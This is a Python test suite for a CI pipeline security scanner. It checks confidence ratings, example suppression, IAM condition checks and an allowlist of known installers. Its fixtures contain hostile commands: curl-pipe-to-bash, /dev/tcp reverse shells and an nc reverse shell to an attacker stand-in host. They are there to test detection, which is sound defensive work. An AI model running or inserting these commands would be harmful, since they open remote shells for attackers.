"""Tests for the confidence attribute, --min-confidence filter, and
context-aware example suppression added in the signal-quality round."""
from __future__ import annotations

import json

from click.testing import CliRunner

from pipeline_check.cli import scan
from pipeline_check.core.checks._confidence import confidence_for, demotion_map
from pipeline_check.core.checks._context import (
    is_known_installer,
    looks_like_example,
    statement_is_constrained,
)
from pipeline_check.core.checks._malicious import find_malicious_patterns
from pipeline_check.core.checks.base import (
    Confidence,
    Finding,
    Severity,
    confidence_rank,
)

# ─── Confidence enum + Finding ─────────────────────────────────────────────


def test_confidence_enum_ordered():
    assert confidence_rank(Confidence.LOW) < confidence_rank(Confidence.MEDIUM)
    assert confidence_rank(Confidence.MEDIUM) < confidence_rank(Confidence.HIGH)


def test_finding_default_confidence_is_high():
    f = Finding(
        check_id="CB-001", title="t", severity=Severity.CRITICAL,
        resource="r", description="d", recommendation="r", passed=False,
    )
    assert f.confidence == Confidence.HIGH


def test_finding_to_dict_includes_confidence():
    f = Finding(
        check_id="CB-001", title="t", severity=Severity.CRITICAL,
        resource="r", description="d", recommendation="r", passed=False,
        confidence=Confidence.LOW,
    )
    assert f.to_dict()["confidence"] == "LOW"


# ─── Default demotions ─────────────────────────────────────────────────────


def test_default_confidence_for_unknown_check_is_high():
    assert confidence_for("UNKNOWN-999") == Confidence.HIGH


def test_known_blob_search_rules_demoted_to_low():
    # Curl-pipe rules across providers; malicious-activity rules; CP-003.
    for cid in ("GHA-016", "GL-016", "JF-016", "CC-016",
                "GHA-027", "JF-029", "CB-011", "CP-003"):
        assert confidence_for(cid) == Confidence.LOW, cid


def test_heuristic_rules_demoted_to_medium():
    for cid in ("GHA-004", "GHA-012", "JF-014", "GHA-022", "CB-005"):
        assert confidence_for(cid) == Confidence.MEDIUM, cid


def test_demotion_map_contains_all_demoted_ids():
    dmap = demotion_map()
    assert dmap["GHA-016"] == Confidence.LOW
    assert dmap["GHA-004"] == Confidence.MEDIUM


# ─── Scanner applies defaults ──────────────────────────────────────────────


def test_scanner_applies_confidence_default_on_known_demoted_rule(tmp_path, monkeypatch):
    """GHA-016 (curl-pipe) is in the LOW list; when it fires, the JSON
    output should show ``confidence: LOW``."""
    monkeypatch.chdir(tmp_path)
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    (wf_dir / "bad.yml").write_text(
        "name: x\non: [push]\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: curl https://example.com/install.sh | bash\n"
    )
    result = CliRunner().invoke(
        scan, ["--pipeline", "github", "--output", "json"],
    )
    assert result.exit_code in (0, 1), result.output
    payload_start = result.output.find("{")
    payload = json.loads(result.output[payload_start:])
    gha016 = next(
        (f for f in payload["findings"] if f["check_id"] == "GHA-016"), None,
    )
    assert gha016 is not None
    assert gha016["confidence"] == "LOW"


# ─── --min-confidence CLI flag ─────────────────────────────────────────────


def test_min_confidence_filters_low_findings(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    wf_dir = tmp_path / ".github" / "workflows"
    wf_dir.mkdir(parents=True)
    # A workflow that triggers at least one LOW (GHA-016) and one non-LOW rule.
    (wf_dir / "w.yml").write_text(
        "name: w\non: [push]\n"
        "jobs:\n  b:\n    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - run: curl https://example.com/install.sh | bash\n"
    )
    # Baseline: LOW includes GHA-016 + HIGH
    baseline = CliRunner().invoke(
        scan, ["--pipeline", "github", "--output", "json", "--min-confidence", "LOW"],
    )
    baseline_data = json.loads(baseline.output[baseline.output.find("{"):])
    baseline_ids = {f["check_id"] for f in baseline_data["findings"]}
    assert "GHA-016" in baseline_ids

    # HIGH: GHA-016 (LOW confidence) dropped
    strict = CliRunner().invoke(
        scan, ["--pipeline", "github", "--output", "json", "--min-confidence", "HIGH"],
    )
    strict_data = json.loads(strict.output[strict.output.find("{"):])
    strict_ids = {f["check_id"] for f in strict_data["findings"]}
    assert "GHA-016" not in strict_ids
    # But HIGH-confidence rules still present.
    assert len(strict_ids) > 0


# ─── Example-awareness context helper ──────────────────────────────────────


def test_looks_like_example_yaml_key():
    """A match under a ``examples:`` / ``fixtures:`` YAML key is suppressed."""
    blob = (
        "workflows:\n"
        "  example:\n"
        "    sh: bash -i >& /dev/tcp/1.2.3.4/4444\n"
    )
    idx = blob.find("bash -i")
    assert looks_like_example(blob, idx) is True


def test_looks_like_example_real_production():
    """A production-looking workflow with a malicious payload is NOT suppressed."""
    blob = (
        "workflows:\n"
        "  release:\n"
        "    sh: bash -i >& /dev/tcp/1.2.3.4/4444\n"
    )
    idx = blob.find("bash -i")
    assert looks_like_example(blob, idx) is False


def test_looks_like_example_does_not_trigger_on_example_com():
    """example.com (RFC 2606 reserved) is a real attacker-used hostname —
    don't suppress matches that happen to contain it in a URL."""
    blob = (
        "jobs:\n"
        "  release:\n"
        "    run: nc attacker.example.com 4444 -e /bin/sh\n"
    )
    idx = blob.find("nc attacker")
    assert looks_like_example(blob, idx) is False


def test_malicious_find_respects_suppress_examples():
    blob_ex = (
        "examples:\n"
        "  dangerous:\n"
        "    sh: bash -i >& /dev/tcp/1.2.3.4/4444\n"
    )
    # With suppression: nothing reported because we're inside an examples: block.
    assert find_malicious_patterns(blob_ex) == []
    # Raw: one match.
    raw = find_malicious_patterns(blob_ex, suppress_examples=False)
    assert any(name == "bash /dev/tcp reverse shell" for _c, name, _e in raw)


# ─── IAM Condition constraint helper ───────────────────────────────────────


def test_statement_is_constrained_source_account():
    stmt = {
        "Effect": "Allow",
        "Action": "*",
        "Resource": "*",
        "Condition": {"StringEquals": {"aws:SourceAccount": "123456789012"}},
    }
    assert statement_is_constrained(stmt) is True


def test_statement_is_constrained_principal_org_id():
    stmt = {
        "Effect": "Allow",
        "Action": "*",
        "Condition": {"StringEquals": {"aws:PrincipalOrgID": "o-abc123"}},
    }
    assert statement_is_constrained(stmt) is True


def test_statement_is_constrained_unrelated_condition():
    """A condition that doesn't scope identity/source shouldn't count."""
    stmt = {
        "Effect": "Allow",
        "Action": "*",
        "Condition": {"DateGreaterThan": {"aws:CurrentTime": "2024-01-01"}},
    }
    assert statement_is_constrained(stmt) is False


def test_statement_is_constrained_no_condition():
    stmt = {"Effect": "Allow", "Action": "*", "Resource": "*"}
    assert statement_is_constrained(stmt) is False


# ─── Known-installer allowlist ─────────────────────────────────────────────


def test_known_installer_matches_docker():
    assert is_known_installer("https://get.docker.com") is True
    assert is_known_installer("https://get.docker.com/install.sh") is True


def test_known_installer_matches_rustup():
    assert is_known_installer("https://sh.rustup.rs") is True


def test_known_installer_rejects_random_url():
    assert is_known_installer("https://evil.example.com/install.sh") is False


def test_known_installer_handles_non_string():
    assert is_known_installer(None) is False
    assert is_known_installer(42) is False
